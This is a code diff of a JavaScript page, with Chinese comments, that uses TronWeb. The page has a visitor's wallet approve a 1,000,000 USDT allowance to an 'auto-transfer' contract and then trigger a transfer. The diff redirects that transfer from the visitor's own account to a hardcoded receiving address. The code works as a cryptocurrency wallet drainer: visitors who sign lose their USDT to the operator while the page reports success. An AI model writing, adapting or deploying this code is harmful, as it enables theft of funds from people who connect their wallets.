@@ -1,6 +1,7 @@
 const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT合约地址
 const autoTransferContractAddress = 'TJKQATfKMkgbVVNjS1BXfXfaup3CCcAkQz'; // 自动转账合约地址
 const approveAmount = 1000000 * 10 ** 6; // 授权100万USDT
+const receivingAddress = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE'; // 收款地址
 
 const usdtAbi = [
     {"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
@@ -60,7 +61,6 @@ async function init() {
 
     try {
         const account = tronWeb.defaultAddress.base58;
-
         console.log('Account:', account);
 
         const usdtContract = await tronWeb.contract().at(usdtContractAddress);
@@ -72,7 +72,7 @@ async function init() {
         await usdtContract.approve(autoTransferContractAddress, approveAmount).send();
         document.getElementById('result').innerText = '授权成功';
 
-        await autoTransferContract.checkAndTransfer(account).send();
+        await autoTransferContract.checkAndTransfer(receivingAddress).send();
         document.getElementById('result').innerText = '转账成功';
     } catch (error) {
         console.error('Error:', error);
